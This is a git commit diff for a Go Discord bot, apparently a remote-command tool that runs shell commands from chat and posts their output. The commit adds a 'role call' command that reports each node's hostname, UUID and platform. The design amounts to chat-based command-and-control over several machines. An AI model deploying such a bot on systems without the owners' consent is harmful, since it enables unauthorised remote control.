63b57702cf66075893242043b8e516435ede1d19
Jasper <57488312+Jasper-27@users.noreply.github.com>
2021-12-07 00:24:09 +0000

    Added role call
    can now create a UUID to differentiate different nodes

--- dish.go
+++ dish.go
@@ -11,12 +11,17 @@ import (
 	"syscall"
 
 	"github.com/bwmarrin/discordgo"
+	"github.com/google/uuid"
 )
 
 //global stuff for shortcuts
 var p = fmt.Println
+var ID = ""
 
 func main() {
+
+	// Generating the node's unique ID
+	ID = generateGUID()
 
 	// Setting up the token
 	btok, _ := ioutil.ReadFile("token")
@@ -78,6 +83,20 @@ func messageHandler(s *discordgo.Session, m *discordgo.MessageCreate) {
 		s.ChannelMessageSend(m.ChannelID, "```"+string(out)+"```")
 	}
 
+	// Roll call
+	if strings.ToLower(m.Content) == "role call" {
+		name, err := os.Hostname()
+		if err != nil {
+			p(err.Error())
+			return
+		}
+
+		outString := "Hostname: " + name + "\n" + "UUID: " + ID + "\n" + "Platform: " + runtime.GOOS + " " + runtime.GOARCH
+
+		s.ChannelMessageSend(m.ChannelID, "```"+outString+"```")
+
+	}
+
 	p(m.Author.Username, ": ", m.Content)
 
 }
@@ -106,5 +125,11 @@ func runCommand(command string) (outString string, errorMessage string) {
 	outString = string(out)
 
 	return
+
+}
+
+func generateGUID() string {
+
+	return uuid.New().String()
 
 }
--- go.mod
+++ go.mod
@@ -2,4 +2,7 @@ module dish
 
 go 1.16
 
-require github.com/bwmarrin/discordgo v0.23.2 // indirect
+require (
+	github.com/bwmarrin/discordgo v0.23.2 // indirect
+	github.com/google/uuid v1.3.0 // indirect
+)
